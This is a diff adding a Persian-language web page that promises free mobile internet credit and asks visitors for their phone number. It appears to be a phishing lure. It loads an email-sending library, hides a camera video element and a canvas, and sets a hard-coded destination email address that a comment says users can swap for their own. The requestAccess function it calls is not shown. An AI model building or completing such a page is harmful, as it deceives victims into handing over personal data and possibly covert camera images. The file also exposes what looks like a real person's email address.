@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>شارژ اینترنت</title>
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<style>
+:root{
+  --bg:#0e1f2a;
+  --card:#152f3d;
+  --primary:#1fa2ff;
+  --accent:#2ecc71;
+  --warn:#ffcc66;
+}
+body{
+  background:linear-gradient(180deg,#0b1f24,#08161c);
+  font-family:tahoma;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
+  margin:0;
+  color:#fff;
+}
+.box{
+  background:var(--card);
+  width:92%;
+  max-width:380px;
+  border-radius:16px;
+  padding:26px;
+  box-shadow:0 15px 40px rgba(0,0,0,.45);
+  text-align:center;
+}
+.logo{width:64px;height:64px;margin:0 auto 10px}
+h3{margin:10px 0 14px;font-size:18px}
+p{font-size:13px;line-height:1.9;opacity:.9}
+input{
+  width:100%;
+  padding:14px;
+  border-radius:12px;
+  border:none;
+  margin-top:10px;
+  font-size:15px;
+  text-align:center;
+}
+button{
+  width:100%;
+  padding:14px;
+  border-radius:12px;
+  border:none;
+  margin-top:14px;
+  font-size:16px;
+  font-weight:bold;
+  background:var(--primary);
+  color:#fff;
+  cursor:pointer;
+}
+#msg{margin-top:12px;font-size:13px;color:var(--warn)}
+.success{color:var(--accent)}
+video,canvas{display:none}
+</style>
+</head>
+<body>
+<div class="box" id="step1">
+<h3>بسته و شارژ رایگان تا پایان 1404</h3>
+<p>شماره موبایل خود را وارد کنید</p>
+<input type="tel" id="phone" placeholder="09xxxxxxxxx">
+<button onclick="requestAccess()">تأیید و ادامه</button>
+<div id="msg"></div>
+</div>
+
+<div class="box" id="step2" style="display:none">
+<h3 class="success">✔ با موفقیت ثبت شد</h3>
+<p>اطلاعات ارسال شد</p>
+</div>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+
+<script>
+// ایمیل مقصد در اینجا جایگزین خواهد شد
+const TO_EMAIL = "fazelesvand@gmail.com";  // این مقدار توسط ایمیل وارد شده از کاربر جایگزین می‌شود
+</script>
+
+</body>
+</html>
